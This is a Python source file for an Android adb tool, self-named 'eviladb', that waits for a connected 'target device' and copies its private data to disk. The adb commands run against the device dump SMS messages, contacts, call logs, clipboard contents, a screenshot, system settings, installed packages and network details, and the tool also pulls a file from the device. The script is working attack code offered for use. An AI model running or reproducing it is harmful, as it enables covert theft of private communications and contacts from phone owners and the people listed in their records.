import os
import json
import subprocess

from uuid import uuid4


from time import sleep
from pathlib import Path

from concurrent.futures import ThreadPoolExecutor

from typing import Optional, List, Dict

from neko.console import SConsole


console = SConsole()

DEFAULT_CLIST = [
  ["shell getprop", "props.txt"],
  ["exec-out screencap -p", "screenshot.png"],
  
  ["shell content query --uri content://sms", "messages.txt"],
  ["shell content query --uri content://contacts/phones/", "contacts.txt"],
  ["shell content query --uri content://call_log/calls", "call_logs.txt"],
  
  ["shell settings list system", "settings_system.txt"],
  ["shell settings list secure", "settings_secure.txt"],
  ["shell settings list global", "settings_global.txt"],

  ["shell pm list packages", "packages.txt"],
  ["shell pm list packages -s", "packages_system.txt"],
  ["shell pm list packages -3", "packages_user.txt"],

  ["shell df -h", "storage_info.txt"],
  ["shell cat /proc/cpuinfo", "cpu_info.txt"],
  ["shell cat /proc/meminfo", "mem_info.txt"],
  ["shell dumpsys sensorservice", "sensors_info.txt"],

  # ["shell netstat", "network_info.txt"],
  ["shell ip addr", "network_interfaces_info.txt"],
  ["shell ip route", "network_ip_route_info.txt"],

  ["shell service call clipboard 1", "clipboard.txt"],
]

# DEFAULT_CLIST = []

PULL_FILES = [
  "/sdcard/Download/vi_script.py"
]


# create directories if not found
def create_dirs(path):
  os.makedirs(path, exist_ok=True)
  return path

# subprocess
def sh(command: str, input_text: List[str] = [], shell: bool = False):
  result = subprocess.run(command if shell else command.strip().split(), capture_output=True, shell=shell, text=True, input="\n".join(input_text))
  if result.returncode != 0:
    raise Exception(result.stderr.strip())
  return result.stdout.strip()

# adb commands
def adb(command: str, input_text: List[str] = [], shell: bool = False):
  return sh(f"adb {command}", input_text=input_text, shell=shell)

def prop(serial, name):
  return adb(f"-s {serial} shell getprop {name}")
  
# clear screen
def clrscr():
  os.system('cls' if os.name == 'nt' else 'clear')

class Device:
  def __init__(self, serial):
    self.id = uuid4().hex
    self.serial = serial
    self.model = prop(self.serial, "ro.product.model")
    self.manufacturer = prop(self.serial, "ro.product.manufacturer")

    #"manufacturer": prop("ro.product.manufacturer"),
    #"brand": prop("ro.product.brand"),
    #"model": prop("ro.product.model"),
    #"device": prop("ro.product.device"),
    #"product": prop("ro.product.name"),
    #"android_version": prop("ro.build.version.release"),
    #"sdk_version": prop("ro.build.version.sdk")
    
    # /storage
    self.path: Path = create_dirs(Path(os.environ.get("KIKX_HOME_PATH", "")) / f"Documents/eviladb/{self.manufacturer}_{self.model}_{self.id}")
    # /storage/files
    self.files_path = create_dirs(self.path / "files")
    
    self.output_logs = []

  def log(self, text: str, error: Optional[str] = None):
    self.output_logs.append(text)

  # exexute command on target
  def exec(self, command: str, shell: bool = False):
    return adb(f"-s {self.serial} {command}", shell=shell)

  # run shell commands
  def shell(self, command: str, shell: bool = False):
    return self.exec(f"shell {command}", shell=shell)

  # pull file from device 
  def pull(self, file: str, dest: str):
    error: Optional[str] = None
    try:
      self.exec(f"pull {file} {self.path / dest}")
    except Exception as e:
      error = e
    finally:
      self.log(f"[ < {file} ]", error)
      console.print(file, padding=1, bg="purple-400/40" if error is None else "red-400/40")
      console.hr()

  def save_to_file(self, command: str, filename: str, symbol: str = ">"):
    error: Optional[str] = None
    try:
      self.exec(f"{command} > {self.path / filename}", shell=True)
    except Exception as e:
      error = e
    finally:
      self.log(f"[ + {filename} ]", error)
      console.print(filename, padding=1, bg="blue-400/40" if error is None else "red-400/40")
      console.hr()
  
  def save_output_logs(self):
    with open(self.path / "eviladb_log.txt", "w") as file:
      file.write("\n".join(self.output_logs))

# list devices array
def list_devices() -> List[Device]:
  output = adb("devices")
  devices = []

  for index, line in enumerate(output.splitlines()):
    if index == 0:
      continue

    serial, status = line.split()
    if status == "offline":
      continue
    
    devices.append(Device(serial))

  return devices
  
# returns serial id
def listen(delay=1):
  while True:
    devices_list = list_devices()

    if len(devices_list) > 0:
      return devices_list

    sleep(delay)
  
  return []

def display_devices() -> Device:
  devices_list = listen()
  
  console.clear()
  console.print("Select Target Device", center=True, padding=2, bg="blue-400/60")
  
  console.hr()
  while True:
    for index, device in enumerate(devices_list):
      console.append(f"""
        <div onclick="sendInput('_select_{index}')" class="p-2 py-4 bg-purple-400/40 border-b">{device.manufacturer} {device.model} ({device.serial})</div>
      """)
  
    input_text = input().strip()
    if input_text.startswith("_select_"):
      return devices_list[index]

# wait for device
console.pre_center("\n[...] Listening [...]\n")

# User will select device
device = display_devices()

console.clear()

console.pre("""
<div class="bg-purple-400/10 shadow-2xl w-full flex items-center justify-center">
▄███▄╶╶╶╶╶╶▄╶╶╶▄█╶█╶╶╶╶╶██╶╶╶██▄╶╶╶███╶╶╶ 
█▀╶╶╶▀╶╶╶╶╶╶█╶╶██╶█╶╶╶╶╶█╶█╶╶█╶╶█╶╶█╶╶█╶╶ 
██▄▄╶╶╶█╶╶╶╶╶█╶██╶█╶╶╶╶╶█▄▄█╶█╶╶╶█╶█╶▀╶▄╶ 
█▄╶╶╶▄▀╶█╶╶╶╶█╶▐█╶███▄╶╶█╶╶█╶█╶╶█╶╶█╶╶▄▀╶ 
▀███▀╶╶╶╶█╶╶█╶╶╶▐╶╶╶╶╶▀╶╶╶╶█╶███▀╶╶███╶╶╶ 
╶╶╶╶╶╶╶╶╶╶█▐╶╶╶╶╶╶╶╶╶╶╶╶╶╶█╶╶╶╶╶╶╶╶╶╶╶╶╶╶ 
╶╶╶╶╶╶╶╶╶╶▐╶╶╶╶╶╶╶╶╶╶╶╶╶╶▀╶╶╶╶╶╶╶╶╶╶╶╶╶╶╶ 
</div>
""", effect="fadeIn")


console.print(r"""
  <div class="p-2 py-4 text-center bg-blue-400/10">
    Created by <span class="text-red-400">\( =_=)/</span> Heker
  </div>
""", dom_purify=False)

console.print(f"{device.manufacturer} | {device.model}", bg="green-400/40", padding=1, center=True)

console.hr()
# Runs everything at once
# First task: save_to_file loop
def save_all():
  for line in DEFAULT_CLIST:
    device.save_to_file(*line)

# Second task: pull loop
def pull_all():
  files_path = create_dirs(device.path / "files")
  for file in PULL_FILES:
    device.pull(file, files_path)

with ThreadPoolExecutor() as executor:
  future1 = executor.submit(save_all)
  future2 = executor.submit(pull_all)

  # Wait for both to finish
  future1.result()
  future2.result()

# eviladb_logs.txt
device.save_output_logs()

console.notify("Eviladb Completed")

console.print(f"Saved In Documents/eviladb ID({device.id})", padding=2, bg="green-400/40")